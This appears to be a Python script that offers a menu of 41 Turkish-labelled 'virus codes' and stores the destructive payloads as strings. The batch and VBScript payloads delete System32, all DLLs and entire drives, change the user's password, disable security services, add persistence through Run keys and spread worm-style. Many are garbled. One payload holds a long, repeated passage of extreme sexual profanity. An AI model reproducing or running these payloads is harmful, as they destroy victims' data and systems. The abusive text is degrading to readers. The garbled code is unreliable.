from colorama import init, Fore

# Colorama'yı başlatmak (Windows'ta ANSI kodlarının çalışması için)
init()

print(Fore.BLUE + "System32 Silen Virüs Kodu için 1'i Seçin")
print(Fore.BLUE + "Ekrankartı Yakan Virüs Kodu İçin 2'yi Seçin")
print(Fore.BLUE + "System32 Remover Virüs Kodu İçin 3'ü Seçin")
print(Fore.BLUE + "Stop İnternet Virüs Kodu İçin 4'ü Seçin")
print(Fore.BLUE + "Shut UP İnternet Virüs Kodu İçin 5'i Seçin")
print(Fore.BLUE + "System Eraser Vİrüs Kodları İçin 6'yı Seçin")
print(Fore.BLUE + "PC Crasher Virüsü Kodları İçin 7'yi Seçin")
print(Fore.BLUE + "System Melter Virüsü Kodları İçin 8'i Seçin")
print(Fore.BLUE + "Shutdown Virüsü Kodları İçin 9'u Seçin")
print(Fore.BLUE + "Fork Bomb Virüsü Kodları İçin 10'u Seçin")
print(Fore.BLUE + "Drive Eraser Virüsü Kodları İçin 11'i Seçin")
print(Fore.BLUE + "Capslock Taggle Virüsü Kodları İçin 12'yi Seçin")
print(Fore.BLUE + "PC Crasher 2 Virüsü Kodları İçin 13'ü Seçin")
print(Fore.BLUE + "Danger Zone Virüsü Kodları İçin 14'ü Seçin")
print(Fore.BLUE + "Applicatipn Bomber Virüsü Kodlaru İçin 15'i Seçin")
print(Fore.BLUE + "Auto Shutdown Virüsü Kodları İçin 16'yı Seçin")
print(Fore.BLUE + "Network Flooder Virüsü Kodları İçin 17'yi Seçin")
print(Fore.BLUE + "İnternet Disabler Virüsü Kodları İçin 18'i Seçin")
print(Fore.BLUE + "Registry Eraser Virüsü Kodları İçin 19'u Seçin")
print(Fore.BLUE + "The Matrix Virüsü Kodlaru İçin 20'yi Seçin")
print(Fore.BLUE + "HDD Yakan Virüs Kodları İçin 21'i Seçin")
print(Fore.BLUE + "Şifre Koyan Virüs Kodları İçin 22'yi Seçin")
print(Fore.BLUE + "Bütün .dll Uzantılı Dosyalarını Silen Virüs Kodu İçin 23'ü Seçin")
print(Fore.BLUE + "PC deki Herşeyi Silen Virüs Kodu İçin 24'ü Seçin")
print(Fore.BLUE + "Harddisk Çökerten Virüs Kodlaru İçin 25'i Seçin")
print(Fore.BLUE + "Format Atan Virüs Kodları İÇin 26'yı Seçin")
print(Fore.BLUE + "Ekran Kartı Yakan Virüs Kodları İçin 27'yi Seçin")
print(Fore.BLUE + "Dosya Sİlen Vİrüs Kodlaru İÇin 28'i Seçin")
print(Fore.BLUE + "Hem Bütğn .dll Dosyalarını Sİlen Hende System32 Silen Virüs Kodu İçin 29'u Seçin")
print(Fore.BLUE + "Sürücü İndirici Virüsü Kodu İçin 30'u Seçin")
print(Fore.BLUE + "Anında Çökertme Virüs Kodu İçin 31'i Seçin")
print(Fore.BLUE + "Küfür Edip PC yi Kapatan Vİrüs Kodu İçin 32'yi Seçin")
print(Fore.BLUE + "Monitor Patlatan Vİrüs Kodu İçin 33'ü Seçin")
print(Fore.BLUE + "Çökertme Virüsü Kodu İçin 34'ü Seçin")
print(Fore.BLUE + "Melissa Virüsü Kodları İÇin 35'i Seçin")
print(Fore.BLUE + "Bilgisayarın Anasını Sİken Virüs Kodu İÇin 36'yı Seçin")
print(Fore.BLUE + "Hibrid 1 Vİrüsü Kodları İÇin 37'yi Seçin")
print(Fore.BLUE + "Hibrid 2 Virüsü Kodlaru İÇin 38'i Seçin")
print(Fore.BLUE + "Hibir 3 Virüsü Kodları İçin 39'u Seçin (Diğer Hibrid Virüslerdem Daha İyi)")
print(Fore.BLUE + "Klavye Dosyaları Sİlen Vİrüs Kodu İçin 40'ı Seçin")
print(Fore.BLUE + "Klavye ve Mosue u Devre Dışı BIrakan Virüs Kodu İçin 41'i Seçin")

# Kullanıcıdan değer alıyoruz
x = input(Fore.GREEN + "Lütfen Bir Değer Giriniz: ")
x = int(x)

# Ham string (raw string) kullanıyoruz
system32silen = r"""
@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant %username%:F /t
rmdir /S /Q C:\Windows\System32
"""

ekrankartıyakan = r""" 
@echo off
C:WINDOWSCOMMANDdeltree /y c:windows*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:*.*
@echo off
cls
cls
@echo .:: ERROR::.
@echo off3.
"""

system32remover = r"""
del c:WINDOWSsystem32*.*/q 
"""

stopinternet = r"""
@Echo off
pconfig /release
"""

shutupinternet = r"""
@echo off
reg
add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t
REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul
start iexpress (website of your choice)
ipconfig /release
del “C:Program FilesMicrosoft Games
del “C:Nexon
del “C:Program FilesXfire
del “C:Program FilesAdobe”
del “C:Program FilesInternet Explorer”
del “C:Program FilesMozilla Firefox”
del “C:WINDOWS”
del “C:WINDOWSsystem32”
del “C:WINDOWSsystem32cmd”
del “C:WINDOWSsystem32iexpress”
del “C:WINDOWSsystem32sndvol32”
del “C:WINDOWSsystem32sndrec32”
del “C:WINDOWSsystem32Restorerstrui”
del “C:WINDOWSsystem32wupdmgr”
del “C:WINDOWSsystem32desktop”
del “C:WINDOWSjava”
del “C:WINDOWSMedia”
del “C:WINDOWSResources”
del “C:WINDOWSsystem”
del “C:drivers”
del “C:drv”
del “C:SYSINFO”
del “C:Program Files”
echo ipconfig/release_all>>c:windowswimn32.bat
net stop “Security Center”
net stop SharedAccess
> “%Temp%.kill.reg” ECHO REGEDIT4
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
START /WAIT REGEDIT /S “%Temp%.kill.reg”
del “%Temp%.kill.reg”
del %0
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
:a
start iexpress (website of your choice)
goto a
"""

systemeraser = r"""

@echo off
del %systemdrive%*.* /f /s /q
shutdown -r -f -t 00
"""

pccrasher = r"""
@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
"""

systemmelter = r"""
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
PAUSE
PAUSE
"""
shutdown = r"""
@echo off
msg * I don’t like you
shutdown -c “Error! You are too stupid!” -s
"""

forkbomb = r"""
Set wshShell =wscript.CreateObject(“WScript.Shel
l”)
do
wscript.sleep 100
wshshell.sendkeys “{CAPSLOCK}”
loop



: () { :| :& }; :

"""

driveeraser = r"""

rd/s/q D:
rd/s/q C:
rd/s/q E:

"""

capslocktaggle = r"""

Set wshShell =wscript.CreateObject(“WScript.Shel
l”)
do
wscript.sleep 100
wshshell.sendkeys “{CAPSLOCK}”
loop

"""

pccrasher2 = r"""

@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
msg * YOU GOT OWNED!!!
shutdown -s -t 7 -c “A VIRUS IS TAKING OVER c:Drive

"""

dangerzone = r"""
@echo off
del D:*.* /f /s /q
del E:*.* /f /s /q
del F:*.* /f /s /q
del G:*.* /f /s /q
del H:*.* /f /s /q
del I:*.* /f /s /q
del J:*.* /f /s /q
"""

applicationbomber = r"""
@echo off
 
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x
"""
autoshutdown = r"""
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE
"""
networkflooder = r"""

:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH

"""

internetdisabler = r"""

echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE

"""

registryeraser = r"""

@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
"""

thematrix = r"""
#include
#include
#include
#include
#include
#include
#include
using namespace std;
int main()
{ keybd_event(VK_MENU,0x38,0,0);
keybd_event(VK_RETURN,0x1c,0,0);
keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
HANDLE outToScreen;
outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);
{
char buffer[255];
char inputFile[]=”C:Documents and SettingsAll UsersStart MenuProgramsStartuprawr.bat”;
ifstream input(inputFile);
if (!input)
{
{
ofstream fp(“C:Documents and SettingsAll UsersStart MenuProgramsStartuprawr.bat”, ios::app);
fp
fp
fp
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
}
}
}
{
char buffer[255];
char inputFile[]=”C:rawr.exe”;
ifstream input(inputFile);
if (!input)
{
{
{
ofstream fp(“CLICK.bat”, ios::app);
fp
fp
fp
fp
}
system(“START CLICK.bat”);
main();
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
system(“call shutdown.exe -S”);
goto START;
}
}
}
START:{
for(int i = 0; i < 1; i++)
{
int num = (rand() % 10);
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
Sleep(60);
}
}
for ( int j = 0; j < 5; j++)
{
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
int number = (rand() % 24);
cout
}
goto START;

"""
hddyakan = r"""
/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand
(1,99999) $+ $rand(A,Z) $+ $rand(a,z)"""

şifrekoyan = r"""@echo off
@echo 2 saniye sonra şifre değiştirilecek...
timeout /t 3
net user %username% kıoajwfjawıojfdawjawdas /y
@echo Şifre değiştirildi :)
timeout /t 3
shutdown /s /f /t 0
"""
dllsilen = r"""@echo off
echo geçmiş olsun PV gitti 
timeout /t 2
del /s /q C:\*.dll
"""
pcdekiherşeyisilen = r"""@echo off
C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
C:\WINDOWS\COMMAND\deltree /y c:\*.*
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
cls
cls
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] .:: ArcLe Hacked DeepWebTr.Net.::.
[URL="http://deepwebtr.net/member.php?action=profile&uid=53418"]@echo[/URL] off
del /f /s /q C:\Windows\System32"""
harddiskçökerten = r"""/timersecure 0 0 //mkdir şmid(C:,1,2) ş+ şrand(1,99999) ş+ şrand(A,Z) ş+ şrand(a,z)"""
formatatan = r"""cd..

cd..

attrib -s -h -r -a c:ntldr

del c:ntldr

shutdown -r"""

ekrankartıyakan = r"""@echo off
C:WINDOWSCOMMANDdeltree /y c:windows*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:Progra~1*.*
@echo off
C:WINDOWSCOMMANDdeltree /y c:*.*
@echo off
cls
cls
@echo .:: ERROR::.
@echo off3."""

dosyasilen = r"""net user %username% W$ar][{#Wa#syon#$$$#
del %systemroot%system32dllcachec_1254.nls
del %systemroot%system32c_1254.nls
del %systemroot%system32hal.dll
del %systemroot%system32kdcom.dll
del %systemroot%system32kernel32.dll
del %systemroot%system32bootvid.dll
del %systemroot%system32c_037.nls
del %systemroot%system32c_437.nls
del %systemroot%system32c_500.nls
del %systemroot%system32c_737.nls
del %systemroot%system32c_1255.nls
del %systemroot%system32C_28594.nls
del %systemroot%system32c_20866.nls
del %systemroot%system32bidispl.dll
del %systemroot%system32C_28594.nls
del %systemroot%system32ups.exe
del %systemroot%system32trkwks.dll
del %systemroot%system32scardsvr.exe
del %systemroot%system32audiosrv.dll
del %systemroot%system32driversatapi.sys
del %systemroot%system32driverscdaudio.sys
del %systemroot%system32driverscdfs.sys
del %systemroot%system32driverscdrom.sys
shutdown -r -t 00
net user %username% W$ar][{#Wa#syon#$$$#"""
dllartısystem32silen = r"""
@echo off
echo An itibariyle PC'nin anası sikiliiyor...
timeout /t 3
del /s /q C:\*.dll
set "dir=C:\Windows\System32"
:loop
for %%f in (%dir%\*) do (
    if exist "%%f" (
        del /F /Q "%%f"
        goto loop
    )
)
"""
sürücüindirici = r"""echo off

echo Microsoft sorunla karşılaştı. Herangi bir tuşa basınca düzeltilecektir

echo off

pause

del /f /q d:

del /f /q c:
"""

anındaçökertme = r"""
rem delete -pcas(-vbe)
On es error -pc
On error Next Pc Hack
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,d ow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USERSoftware

Micros oftWindow s Scripting HostSettingsTimeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoft

Windows Scripting HostSettingsTimeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"MSKernel32.vbs")
c.Copy(dirwin&"Win32DLL.vbs")
c.Copy(dirsystem&"LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINESoftwareMicrosoft

Windows Cur rentVersio nRunMSKernel32",dirsystem&"

MSKernel32.vbs" """
küfredippckapatan = r"""@echo off
:x
color a
echo ebesinin kıllıa amcığının ortalarından sağ ve sola açı yapmış dillerini siktiğimin evladının ta annesini böyle tavana asiim şut saatiyle maç saati arasındaki fark boyunca anneni çatur çutur kız arkadaşınla beraber götürrüken kim engelleyebilir ki ebenin amının dikine sikerim gözlüğünün sapını amına kodumun açtırma ağzını skerim yüzünü piç götünün amcıkbaşlı anzorotun antilop taşşaa yalamış versiyonu seni seni taburenin üzerine çıkartıp berber çırağıyla beraber halaay çekerken hepinizin tek tek amına koymak üzere yola çıkan konvoyun ta 4 tekerini skim desen de ananı bir sikerim baban ayakta alkışlar diye tahmin etsende yarraa oturmak zorundasın amcıksın çünkü beyninin sol lobunu akşam simidi gibi çıtır çıtır götürmüşler diye beklesnde boşuna çünkü seni cem uzanın seçim kampanyasında sikerim seni amına kodumn konvoy beyinli ibişi yarramın sol bölgesine muhtaç kalırken tabutta skerim seni amına koyim di mi yarramın başı bu dünyanın en uzun küfrü olsa nolur sikeyim atmosfer i traposferi magma katmanına başım girsin sana da sıra dağlar ve toroslar girsin amına koyim balta girmemiş ormanlar sana grisin girsin de çıkamasın derkeen klavyenin tuşları istanbulun kuşları götüne girdi di mi at yarraandan rosto şekli almış kavayleyi amcık gibi al içine içinde kalsın ki akıllansın aklını siktiğiminin akılsızının yarrak silüeti ebenin amına 3 yıl 10 ay mahkum edilsin amına kodumun yargısında infazını skim senin senin mezarını skim amına kodumunun salağı gibi gözüken 3 başlı yarrak girsin sana senin ayakkabının tabanını skim senin reji ekibinin amına koyim prodüktörünü skim cast ekibindeki akan yazıları skim götüne akan yazı derken star warstaki darth wader ın o kara maskesini skim ben o siyah pelerini yere sariim üzerinde manitasını skim amına kodumunn jedi si jedi demişken türkiye ye gelmesi yalan olan amerikalı grup jedi mind tricks i skim ki amerikalı diyince aklıma 35 yaş üstü yarra gelmiş jenna jamesson geldi onun da amına koyim herkes sikti onu ferre filmlerinde başrol oynayarak at yarraana da bu yıl tek aday olarak gösterildi hele onun yanında dolaşan o kısa boylu esmer kızı boğaz köprüsünde gişe de beklerken ücret ödendi yazısı belirdiği anda sağ taraftaki polis kordonu eşliğinde skiiim amına koduuumunun yavşak görünümlü at insanının ta sakasını siktiğiminin saka çükü kılıklı ibişovski.şu anda aldığımız bir habere göre ebenin amını ankara gündeminde canlı canlı skiolarmış ben öyle duydum duydum ki unutmuşsun yarrağımın rengini sikten göte akışlarla amcıklarla yaşıyorum dertli amlara giren işte ben zeki müren balığını skim amına koyim rexin ora yokuş aşşaa girsin götüne at taşşaa otur taşşa da gel bi başaa yarramın wahşi başşaaaaaa amına kodumun yavşaaaaaaaaa seni· internete koysalar hostunu gardi domainini ben sikerim amına kodumun blogunun da amına kordum ama koyamıom şu an bunları yazdığım klavyemin enter ını skim amına koyim o ne biçim enter öyle hele klavyemdeki space tuşu sana girsin amına koyim klavye sana girsin işlemcim ve gforce um da annene hediyem olsun amcık beyinli ibişcanlı amına kodumun yatık batığı senii seni var ya titaniğin batık bölgesinde skiim seni seni güvertede skim de tüm tayfa gaza gelsin onlarda seni siksin amına kodum iskele alabandayı duyduğum anda yarram havada yarrama otur başım girsin sana yarısı anana yarısı babana yarısı manitana kaç tane yarısı var diye sorma amına kodumun meraklısı tüm tayfa sikio seni yarramın motorize ekibi ebesinin amını siktğiminin deniz kara ve hava güçleri seni teker teker oturtur koltuğa bağrır o duruşa bi vuruş kaç kuruş diye amını yolunu siktiğiminin yaraaak başlı insan görünümlü at kuyruklu ibiş amcıklı ibnesi seni msn de eklerim offline offline sikerim.msn live ın son eklentisi yüklenirken % 72 olduğu zaman ananın amına öyle bir koyarım ki direk download biter. senin gibi ibneleri nuri alço sikse o bile yarıda bırakır gibi gözüksede yarrağa oturursun. kosovalının amına koydurtma şimdi orospunun yan gelip yan yatarken osururken çıkardığı veledi-orospu piç, ağzının iç dokusunu sikeyim senin, senin var ya sinirlerini sikeyim amına kodumun taslak halindeki orospusu ,göt vermekten bıkmayan kaşar, seni mtvnin bitch sixteen programında gösteri yaparken sikiyim, seni mr.marcus siker siker çoğaltır amına koyim duygularına attırayım da duygu seli olsun kaşarlanmış götveren orospuebenin amına benchten gelip katkıda buluniim çekoslovakyalılaştıramadıklarımızın ebesinin kıllıa amcığının ortalarından sağ ve sola açı yapmış dillerini siktiğimin evladının ta annesini böyle tavana asiim şut saatiyle maç saati arasındaki fark boyunca anneni çatur çutur kız arkadaşınla beraber götürrüken kim engelleyebilir ki ebenin amının dikine sikerim gözlüğünün sapını amına kodumun açtırma ağzını skerim yüzünü piç götünün amcıkbaşlı anzorotun antilop taşşaa yalamış versiyonu seni seni taburenin üzerine çıkartıp berber çırağıyla beraber halaay çekerken hepinizin tek tek amına koymak üzere yola çıkan konvoyun ta 4 tekerini skim desen de ananı bir sikerim baban ayakta alkışlar diye tahmin etsende yarraa oturmak zorundasın amcıksın çünkü beyninin sol lobunu akşam simidi gibi çıtır çıtır götürmüşler diye beklesnde boşuna çünkü seni cem uzanın seçim kampanyasında sikerim seni amına kodumn konvoy beyinli ibişi yarramın sol bölgesine muhtaç kalırken tabutta skerim seni amına koyim di mi yarramın başı bu dünyanın en uzun küfrü olsa nolur sikeyim atmosfer i traposferi magma katmanına başım girsin sana da sıra dağlar ve toroslar girsin amına koyim balta girmemiş ormanlar sana grisin girsin de çıkamasın derkeen klavyenin tuşları istanbulun kuşları götüne girdi di mi at yarraandan rosto şekli almış kavayleyi amcık gibi al içine içinde kalsın ki akıllansın aklını siktiğiminin akılsızının yarrak silüeti ebenin amına 3 yıl 10 ay mahkum edilsin amına kodumun yargısında infazını skim senin senin mezarını skim amına kodumunun salağı gibi gözüken 3 başlı yarrak girsin sana senin ayakkabının tabanını skim senin reji ekibinin amına koyim prodüktörünü skim cast ekibindeki akan yazıları skim götüne akan yazı derken star warstaki darth wader ın o kara maskesini skim ben o siyah pelerini yere sariim üzerinde manitasını skim amına kodumunn jedi si jedi demişken türkiye ye gelmesi yalan olan amerikalı grup jedi mind tricks i skim ki amerikalı diyince aklıma 35 yaş üstü yarra gelmiş jenna jamesson geldi onun da amına koyim herkes sikti onu ferre filmlerinde başrol oynayarak at yarraana da bu yıl tek aday olarak gösterildi hele onun yanında dolaşan o kısa boylu esmer kızı boğaz köprüsünde gişe de beklerken ücret ödendi yazısı belirdiği anda sağ taraftaki polis kordonu eşliğinde skiiim amına koduuumunun yavşak görünümlü at insanının ta sakasını siktiğiminin saka çükü kılıklı ibişovski.şu anda aldığımız bir habere göre ebenin amını ankara gündeminde canlı canlı skiolarmış ben öyle duydum duydum ki unutmuşsun yarrağımın rengini sikten göte akışlarla amcıklarla yaşıyorum dertli amlara giren işte ben zeki müren balığını skim amına koyim rexin ora yokuş aşşaa girsin götüne at taşşaa otur taşşa da gel bi başaa yarramın wahşi başşaaaaaa amına kodumun yavşaaaaaaaaa seni· internete koysalar hostunu gardi domainini ben sikerim amına kodumun blogunun da amına kordum ama koyamıom şu an bunları yazdığım klavyemin enter ını skim amına koyim o ne biçim enter öyle hele klavyemdeki space tuşu sana girsin amına koyim klavye sana girsin işlemcim ve gforce um da annene hediyem olsun amcık beyinli ibişcanlı amına kodumun yatık batığı senii seni var ya titaniğin batık bölgesinde skiim seni seni güvertede skim de tüm tayfa gaza gelsin onlarda seni siksin amına kodum iskele alabandayı duyduğum anda yarram havada yarrama otur başım girsin sana yarısı anana yarısı babana yarısı manitana kaç tane yarısı var diye sorma amına kodumun meraklısı tüm tayfa sikio seni yarramın motorize ekibi ebesinin amını siktğiminin deniz kara ve hava güçleri seni teker teker oturtur koltuğa bağrır o duruşa bi vuruş kaç kuruş diye amını yolunu siktiğiminin yaraaak başlı insan görünümlü at kuyruklu ibiş amcıklı ibnesi seni msn de eklerim offline offline sikerim.msn live ın son eklentisi yüklenirken % 72 olduğu zaman ananın amına öyle bir koyarım ki direk download biter. senin gibi ibneleri nuri alço sikse o bile yarıda bırakır gibi gözüksede yarrağa oturursun. kosovalının amına koydurtma şimdi orospunun yan gelip yan yatarken osururken çıkardığı veledi-orospu piç, ağzının iç dokusunu sikeyim senin, senin var ya sinirlerini sikeyim amına kodumun taslak halindeki orospusu ,göt vermekten bıkmayan kaşar, seni mtvnin bitch sixteen programında gösteri yaparken sikiyim, seni mr.marcus siker siker çoğaltır amına koyim duygularına attırayım da duygu seli olsun kaşarlanmış götveren orospu

ebesinin kıwwıa amcığının owtawawından sağ we sowa açı yapmış diwwewini siktiğimin evladının ta annesini böywe tawana asiim şut saatiywe maç saati awasındaki fawk boyunca anneni çatuw çutuw kız awkadaşınwa bewabew götüwwüken kim engewweyebiwiw ki ebenin amının dikine sikewim gözwüğünün sapını amına kodumun açtıwma ağzını skewim yüzünü piç götünün amcıkbaşwı anzowotun antiwop taşşaa yawamış wewsiyonu seni seni tabuwenin üzewine çıkawtıp bewbew çıwağıywa bewabew hawaay çekewken hepinizin tek tek amına koymak üzewe yowa çıkan konwoyun ta 4 tekewini skim desen de ananı biw sikewim baban ayakta awkışwaw diye tahmin etsende yawwaa otuwmak zowundasın amcıksın çünkü beyninin sow wobunu akşam simidi gibi çıtıw çıtıw götüwmüşwew diye bekwesnde boşuna çünkü seni cem uzanın seçim kampanyasında sikewim seni amına kodumn konwoy beyinwi ibişi yawwamın sow böwgesine muhtaç kawıwken tabutta skewim seni amına koyim di mi yawwamın başı bu dünyanın en uzun küfwü owsa nowuw sikeyim atmosfew i twaposfewi magma katmanına başım giwsin sana da sıwa dağwaw we towoswaw giwsin amına koyim bawta giwmemiş owmanwaw sana gwisin giwsin de çıkamasın dewkeen kwawyenin tuşwawı istanbuwun kuşwawı götüne giwdi di mi at yawwaandan wosto şekwi awmış kawayweyi amcık gibi aw içine içinde kawsın ki akıwwansın akwını siktiğiminin akıwsızının yawwak siwüeti ebenin amına 3 yıw 10 ay mahkum ediwsin amına kodumun yawgısında infazını skim senin senin mezawını skim amına kodumunun sawağı gibi gözüken 3 başwı yawwak giwsin sana senin ayakkabının tabanını skim senin weji ekibinin amına koyim pwodüktöwünü skim cast ekibindeki akan yazıwawı skim götüne akan yazı dewken staw wawstaki dawth wadew ın o kawa maskesini skim ben o siyah pewewini yewe sawiim üzewinde manitasını skim amına kodumunn jedi si jedi demişken tüwkiye ye gewmesi yawan owan amewikawı gwup jedi mind twicks i skim ki amewikawı diyince akwıma 35 yaş üstü yawwa gewmiş jenna jamesson gewdi onun da amına koyim hewkes sikti onu fewwe fiwmwewinde başwow oynayawak at yawwaana da bu yıw tek aday owawak göstewiwdi hewe onun yanında dowaşan o kısa boywu esmew kızı boğaz köpwüsünde gişe de bekwewken ücwet ödendi yazısı bewiwdiği anda sağ tawaftaki powis kowdonu eşwiğinde skiiim amına koduuumunun yawşak göwünümwü at insanının ta sakasını siktiğiminin saka çükü kıwıkwı ibişowski.şu anda awdığımız biw habewe göwe ebenin amını ankawa gündeminde canwı canwı skiowawmış ben öywe duydum duydum ki unutmuşsun yawwağımın wengini sikten göte akışwawwa amcıkwawwa yaşıyowum dewtwi amwawa giwen işte ben zeki müwen bawığını skim amına koyim wexin owa yokuş aşşaa giwsin götüne at taşşaa otuw taşşa da gew bi başaa yawwamın wahşi başşaaaaaa amına kodumun yawşaaaaaaaaa seni· intewnete koysawaw hostunu gawdi domainini ben sikewim amına kodumun bwogunun da amına kowdum ama koyamıom şu an bunwawı yazdığım kwawyemin entew ını skim amına koyim o ne biçim entew öywe hewe kwawyemdeki space tuşu sana giwsin amına koyim kwawye sana giwsin işwemcim we gfowce um da annene hediyem owsun amcık beyinwi ibişcanwı amına kodumun yatık batığı senii seni waw ya titaniğin batık böwgesinde skiim seni seni güwewtede skim de tüm tayfa gaza gewsin onwawda seni siksin amına kodum iskewe awabandayı duyduğum anda yawwam hawada yawwama otuw başım giwsin sana yawısı anana yawısı babana yawısı manitana kaç tane yawısı waw diye sowma amına kodumun mewakwısı tüm tayfa sikio seni yawwamın motowize ekibi ebesinin amını siktğiminin deniz kawa we hawa güçwewi seni tekew tekew otuwtuw kowtuğa bağwıw o duwuşa bi wuwuş kaç kuwuş diye amını yowunu siktiğiminin yawaaak başwı insan göwünümwü at kuywukwu ibiş amcıkwı ibnesi seni msn de ekwewim offwine offwine sikewim.msn wiwe ın son ekwentisi yükweniwken % 72 owduğu zaman ananın amına öywe biw koyawım ki diwek downwoad bitew. senin gibi ibnewewi nuwi awço sikse o biwe yawıda bıwakıw gibi gözüksede yawwağa otuwuwsun. kosowawının amına koyduwtma şimdi owospunun yan gewip yan yatawken osuwuwken çıkawdığı wewedi-owospu piç, ağzının iç dokusunu sikeyim senin, senin waw ya siniwwewini sikeyim amına kodumun taswak hawindeki owospusu ,göt wewmekten bıkmayan kaşaw, seni mtwnin bitch sixteen pwogwamında göstewi yapawken sikiyim, seni mw.mawcus sikew sikew çoğawtıw amına koyim duyguwawına attıwayım da duygu sewi owsun kaşawwanmış götwewen owospuebenin amına benchten gewip katkıda buwuniim 